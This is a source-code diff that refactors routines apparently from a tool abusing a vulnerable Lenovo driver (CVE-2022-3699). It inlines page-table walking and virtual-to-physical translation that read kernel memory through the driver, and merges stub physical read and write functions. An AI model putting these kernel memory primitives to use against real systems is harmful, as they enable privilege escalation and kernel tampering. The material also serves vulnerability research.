@@ -6,7 +6,7 @@
 *
 *  VERSION:     1.31
 *
-*  DATE:        08 Apr 2023
+*  DATE:        09 Apr 2023
 *
 *  Lenovo driver routines.
 *
@@ -23,10 +23,6 @@
 //
 // Based on CVE-2022-3699.
 //
-typedef enum _PAGE_TYPE {
-    PageTypePte,
-    PageTypePde
-} PAGE_TYPE;
 
 static PHYSICAL_ADDRESS g_LddSwapAddress;
 static ULONG_PTR g_MiPteBase;
@@ -49,83 +45,6 @@ BOOL LddReadVirtualAddressPrimitive(
     }\
 
 /*
-* LdrpCreatePteHierarchy
-*
-* Purpose:
-*
-* nt!MiCreatePteHierarchy rip-off.
-*
-*/
-VOID LdrpCreatePteHierarchy(
-    _In_ ULONG_PTR VirtualAddress,
-    _Inout_ MI_PTE_HIERARCHY* PteHierarchy
-)
-{
-    ///
-    /// Resolve the PTE address.
-    /// 
-    VirtualAddress >>= 9;
-    VirtualAddress &= 0x7FFFFFFFF8;
-    VirtualAddress += g_MiPteBase;
-
-    PteHierarchy->PTE = VirtualAddress;
-
-    ///
-    /// Resolve the PDE address.
-    /// 
-    VirtualAddress >>= 9;
-    VirtualAddress &= 0x7FFFFFFFF8;
-    VirtualAddress += g_MiPteBase;
-
-    PteHierarchy->PDE = VirtualAddress;
-
-    ///
-    /// Resolve the PPE address.
-    /// 
-    VirtualAddress >>= 9;
-    VirtualAddress &= 0x7FFFFFFFF8;
-    VirtualAddress += g_MiPteBase;
-
-    PteHierarchy->PPE = VirtualAddress;
-
-    ///
-    /// Resolve the PXE address.
-    /// 
-    VirtualAddress >>= 9;
-    VirtualAddress &= 0x7FFFFFFFF8;
-    VirtualAddress += g_MiPteBase;
-
-    PteHierarchy->PXE = VirtualAddress;
-
-}
-
-PAGE_TYPE LddpGetPageTypeForVirtualAddress(
-    _In_ HANDLE DeviceHandle,
-    _In_ ULONG_PTR VirtualAddress,
-    _In_ MMPTE* PageTableEntry
-)
-{
-    MI_PTE_HIERARCHY PteHierarchy = { 0, 0, 0, 0 };
-
-    LdrpCreatePteHierarchy(VirtualAddress, &PteHierarchy);
-
-    LddReadVirtualAddressPrimitive(DeviceHandle,
-        PteHierarchy.PTE,
-        &PageTableEntry->Value);
-
-    if (PageTableEntry->Value == 0) {
-
-        LddReadVirtualAddressPrimitive(DeviceHandle,
-            PteHierarchy.PDE,
-            &PageTableEntry->Value);
-
-        return PageTypePde;
-    }
-
-    return PageTypePte;
-}
-
-/*
 * LddpVirtualToPhysical
 *
 * Purpose:
@@ -138,14 +57,29 @@ BOOL WINAPI LddpVirtualToPhysical(
     _In_ ULONG_PTR VirtualAddress,
     _Out_ ULONG_PTR* PhysicalAddress)
 {
-    MMPTE Pte;
+    MMPTE PageTableEntry;
     PAGE_TYPE PageType;
+    MI_PTE_HIERARCHY PteHierarchy = { 0, 0, 0, 0 };
 
-    Pte.Value = 0;
+    supCreatePteHierarchy(VirtualAddress, &PteHierarchy, g_MiPteBase);
 
-    PageType = LddpGetPageTypeForVirtualAddress(DeviceHandle,
-        VirtualAddress,
-        &Pte);
+    PageTableEntry.Value = 0;
+
+    LddReadVirtualAddressPrimitive(DeviceHandle,
+        PteHierarchy.PTE,
+        &PageTableEntry.Value);
+
+    if (PageTableEntry.Value == 0) {
+
+        LddReadVirtualAddressPrimitive(DeviceHandle,
+            PteHierarchy.PDE,
+            &PageTableEntry.Value);
+
+        PageType = PageTypePde;
+    }
+    else {
+        PageType = PageTypePte;
+    }
 
     switch (PageType) {
     case PageTypePte:
@@ -159,7 +93,7 @@ BOOL WINAPI LddpVirtualToPhysical(
         return FALSE;
     }
 
-    *PhysicalAddress = (Pte.HarwarePte.PageFrameNumber << 12) + VirtualAddress;
+    *PhysicalAddress = (PageTableEntry.HardwarePte.PageFrameNumber << 12) + VirtualAddress;
 
     return TRUE;
 }
@@ -277,42 +211,18 @@ BOOL LddReadVirtualAddressPrimitive(
 }
 
 /*
-* LddReadPhysicalMemory
+* LddReadWritePhysicalMemoryStub
 *
 * Purpose:
 *
-* Read from physical memory.
+* Stub.
 *
 */
-BOOL WINAPI LddReadPhysicalMemory(
+BOOL WINAPI LddReadWritePhysicalMemoryStub(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG_PTR PhysicalAddress,
     _In_ PVOID Buffer,
     _In_ ULONG NumberOfBytes)
-{
-    UNREFERENCED_PARAMETER(DeviceHandle);
-    UNREFERENCED_PARAMETER(PhysicalAddress);
-    UNREFERENCED_PARAMETER(Buffer);
-    UNREFERENCED_PARAMETER(NumberOfBytes);
-
-    SetLastError(ERROR_CALL_NOT_IMPLEMENTED);
-    return FALSE;
-}
-
-/*
-* LddWritePhysicalMemory
-*
-* Purpose:
-*
-* Write to physical memory.
-*
-*/
-BOOL WINAPI LddWritePhysicalMemory(
-    _In_ HANDLE DeviceHandle,
-    _In_ ULONG_PTR PhysicalAddress,
-    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
-    _In_ ULONG NumberOfBytes
-)
 {
     UNREFERENCED_PARAMETER(DeviceHandle);
     UNREFERENCED_PARAMETER(PhysicalAddress);
